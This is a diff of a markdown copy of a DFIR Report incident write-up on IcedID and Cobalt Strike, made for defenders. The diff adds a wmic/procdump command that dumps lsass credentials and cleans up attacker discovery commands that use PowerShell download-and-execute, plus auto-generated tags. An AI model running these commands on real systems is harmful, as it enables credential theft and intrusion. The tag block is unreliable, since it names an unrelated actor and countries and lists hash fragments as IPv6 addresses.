@@ -1,14 +1,15 @@
 # IcedID and Cobalt Strike vs Antivirus
-### 
+### In June, we saw another threat actor utilize IcedID to download Cobalt Strike (CS), which was used to pivot to other systems in the environment.  Similar to the Sodinokibi case, anti-virus (AV) slowed down the attackers.  AV frustrated them to the point where they temporarily left the environment.
 
 ## Information:
 + Source: The DFIR Report
-+ Link: [article](https://thedfirreport.com/2021/07/19/icedid-and-cobalt-strike-vs-antivirus/)
-+ Date: July 19, 2021
-+ Author: Unknown
++ Link: https://thedfirreport.com/2021/07/19/icedid-and-cobalt-strike-vs-antivirus/
++ Date: 2021-07-19T00:25:47+00:00
++ Author: editor
 
 
 ## Article:
+![Article Image](https://thedfirreport.com/wp-content/uploads/2021/07/4485-r03.png)
 
 ### Intro
 
@@ -183,6 +184,11 @@ Using these credentials, the threat actors attempted to use a Cobalt Strike beac
 [![](https://thedfirreport.com/wp-content/uploads/2021/07/01-Procdump-On-File-Server.png)](https://thedfirreport.com/wp-content/uploads/2021/07/01-Procdump-On-File-Server.png)
 
 
+
+```
+cmd.exe /C wmic /node:"servername.domainname" process call create "C:\PerfLogs\procdump.exe -accepteula -ma lsass C:\PerfLogs\lsass.dmp"
+```
+
 This activity appears to have failed due to Windows Defender activity.
 
 
@@ -216,7 +222,7 @@ Later, Cobalt Strike beacons were used to perform discovery of the system and do
 ```
 cmd.exe /C systeminfo
 cmd.exe /C nltest /dclist:DOMAIN.local
-cmd.exe /C nltest /domain\_trusts /all\_trusts
+cmd.exe /C nltest /domain_trusts /all_trusts
 IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:55869/'); Find-LocalAdminAccess
 ```
 
@@ -278,7 +284,7 @@ IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:41046/'); Get-Do
 IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:38102/'); Get-DomainComputer -Properties dnshostname
 IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:35452/'); Get-DomainComputer -OperatingSystem *server* -Properties dnshostname
 IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:61999/'); Get-DomainComputer -Properties dnshostname -Ping.
-$dr=Get-WmiObject Win32\_LogicalDisk; $total=0; foreach($i in $dr){ ; if($i.DriveType -eq 3 ){$diskFill = ([int]($i.Size/1GB)-[int]($i.FreeSpace/1GB));$total=$total+$diskFill;} } 'Total  ' + $env:computername +' ' + $total
+$dr=Get-WmiObject Win32_LogicalDisk; $total=0; foreach($i in $dr){ ; if($i.DriveType -eq 3 ){$diskFill = ([int]($i.Size/1GB)-[int]($i.FreeSpace/1GB));$total=$total+$diskFill;} } 'Total  ' + $env:computername +' ' + $total
 IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:51127/'); Get-PSDrive
 IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:34025/'); Invoke-ShareFinder -Ping -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\shar.txt
 ```
@@ -301,7 +307,10 @@ IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:34025/'); Invoke
 [![](https://thedfirreport.com/wp-content/uploads/2021/07/03-LM-Chain-2.png)](https://thedfirreport.com/wp-content/uploads/2021/07/03-LM-Chain-2.png)
 
 
-**Lateral Movement chain #3** – Privileges were escalated to SYSTEM on Workstation #1 via the Cobalt Strike ‘GetSystem’ command which makes use of named pipes. A Cobalt Strike DLL was copied to a server and executed using WMI. This activity was observed on three servers, including the Domain Controller. 
+**Lateral Movement chain #3** – Privileges were escalated to SYSTEM on Workstation #1 via the Cobalt Strike ‘GetSystem’ command which makes use of named pipes. A Cobalt Strike DLL was copied to a server and executed using WMI. This activity was observed on three servers, including the Domain Controller.
+
+
+![](https://thedfirreport.com/wp-content/uploads/2021/07/1.png)
 
 
 [![](https://thedfirreport.com/wp-content/uploads/2021/07/04-LM-Chain-3.png)](https://thedfirreport.com/wp-content/uploads/2021/07/04-LM-Chain-3.png)
@@ -875,5 +884,25 @@ Internal case #4485
 
 
 
-#### Tags:
-[[exe]] [[IcedID]] [[windir]] [[adfind]] [[https]] [[x86]] [[dllhost]] [[HTTP]] [[jquery-3]] [[x64]] [[The DFIR Report]]
+## Tags:
+
+#### Threatactor:
+[[threatactor.name=BRONZE BUTLER]]
+
+#### Action:
+[[action.malware.name=AdFind]] [[action.malware.name=Aria-body]] [[action.malware.name=Arp]] [[action.malware.name=at]] [[action.malware.name=at]] [[action.malware.name=cmd]] [[action.malware.name=cmd]] [[action.malware.name=Cobalt Strike]] [[action.malware.name=Conti]] [[action.malware.name=Empire]] [[action.malware.name=IcedID]] [[action.malware.name=ipconfig]] [[action.malware.name=Mimikatz]] [[action.malware.name=Net]] [[action.malware.name=Net]] [[action.malware.name=njRAT]] [[action.malware.name=Nltest]] [[action.malware.name=Ping]] [[action.malware.name=Ping]] [[action.malware.name=PoshC2]] [[action.malware.name=Reg]] [[action.malware.name=Reg]] [[action.malware.name=REvil]] [[action.malware.name=REvil]] [[action.malware.name=S-Type]] [[action.malware.name=Systeminfo]] [[action.malware.name=Systeminfo]] [[action.malware.name=Tor]]
+
+#### Location:
+[[victim.country.name=Mali]] [[victim.continent.name=Africa]] [[victim.city.name=]] [[victim.country.name=Haiti]] [[victim.continent.name=North and Central America]]
+
+### Autogenerated Tags:
+[[Icedid]] [[Hta]] [[Dll]] [[The DFIR Report]]
+#### ipv4-adresses
+127.0.0.1 91.193.19.37 45.153.240.135 172.67.222.68 164.90.157.246 109.230.199.73 162.244.81.62 213.252.245.62 88.80.147.101 185.38.185.121
+#### ipv6-adresses
+23:FA:7E:CD:F4:13:7C:967C: 30:AC:3C:DD:D6:25:99:DB99: 0F:9E:24:12:4D:36:90:9390: 55:B5:8D:C1:26:0D:2F:792F: 04:2f:14:f8:9d:82:a2:39a2: 2e:ea:8e:4f:c1:b7:0d:b80d:
+#### urls
+http://povertyboring2020b.com. http://127.0.0.1:55869/'); http://127.0.0.1:41046/'); http://127.0.0.1:38102/'); http://127.0.0.1:35452/'); http://127.0.0.1:61999/'); http://127.0.0.1:51127/'); http://127.0.0.1:34025/'); https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_powershell_enc_cmd.yml https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_procdump_lsass.yml https://github.com/SigmaHQ/sigma/blob/99b0d32cec5746c8f9a79ddbbeb53391cef326ba/rules/windows/process_creation/win_trust_discovery.yml https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_ad_find_discovery.yml https://github.com/SigmaHQ/sigma/blob/7288ae93b9ec8d09f56cdc623a44a21fa0826afb/rules/windows/process_creation/process_creation_cobaltstrike_load_by_rundll32.yml https://github.com/SigmaHQ/sigma/blob/bbe67ddc73adaa245941fe240db4eff3279078a8/rules/windows/registry_event/sysmon_cobaltstrike_service_installs.yml https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_uac_fodhelper.yml https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/builtin/win_pass_the_hash_2.yml https://thedfirreport.com*//* https://thedfirreport.com
+#### MITRE IDs
+[[T1569.002]] [[T1566.001]] [[T1204.002]] [[T1059.001]] [[T1059.003]] [[T1543.003]] [[T1548.002]] [[T1518.001]] [[T1021.002]]
+
